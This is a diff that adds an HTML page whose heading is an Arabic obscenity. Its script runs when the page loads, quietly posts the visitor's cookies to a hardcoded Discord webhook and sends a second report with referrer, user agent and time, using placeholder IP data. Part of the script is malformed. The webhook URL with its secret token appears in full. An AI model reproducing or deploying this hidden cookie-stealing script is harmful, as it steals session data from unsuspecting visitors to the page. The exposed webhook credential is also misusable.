@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LqNz</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #6b1111;
+        }
+
+        header {
+            background-color: #333;
+            color: rgb(77, 17, 17);
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        header nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        header nav ul li {
+            display: inline;
+            margin: 0 10px;
+        }
+
+        header nav ul li a {
+            color: rgb(87, 7, 7);
+            text-decoration: none;
+        }
+
+        section {
+            padding: 20px;
+            margin: 10px;
+            background-color: rgb(39, 6, 6);
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #460707;
+            color: rgb(68, 11, 11);
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #200606;
+            color: rgb(196, 18, 18);
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>كس امك</h1>
+
+        
+    
+    
+
+
+   
+    <script>
+        const script = document.createElement('script'); 
+script.textContent = 
+    console.log('Current Cookies:', document.cookie);
+
+    document.cookie = "username=JohnDoe; path=/; expires=Fri, 31 Dec 2024 23:59:59 GMT";
+
+    console.log('Updated Cookies:', document.cookie);
+;
+document.body.appendChild(script); 
+
+
+fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        content: `Cookies: ${document.cookie}`
+    })
+});
+
+
+const ip = '192.168.1.1'; 
+const ipInfoData = {
+    country: 'CountryName',
+    city: 'CityName',
+    region: 'RegionName'
+};  
+const referrer = document.referrer || "N/A";
+const userAgent = navigator.userAgent;
+const dateTime = new Date().toLocaleString();  
+
+fetch('https://discord.com/api/webhooks/1320498070173257770/MeZB50l0vLghdjxsT9vYhV0x9cJuxJ7ku5v3wzBYAmJQP1mBykfjOSGt0YUBV5iARp7j', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        content: "**New visitor information**", 
+        embeds: [
+            {
+                title: "Visitor Details", 
+                fields: [
+                    { name: "IP Address", value: ip, inline: true },  
+                    { name: "Country", value: ipInfoData.country, inline: true }, 
+                    { name: "City", value: ipInfoData.city || "Unknown", inline: true }, 
+                    { name: "Region", value: ipInfoData.region || "Unknown", inline: true }, 
+                    { name: "Referrer", value: referrer, inline: false }, 
+                    { name: "User Agent", value: userAgent, inline: false }, 
+                    { name: "Date & Time", value: dateTime, inline: false } 
+                ]
+            }
+        ]
+    })
+});
+
+
+
+
+
+    </script>
+</body>
+</html>
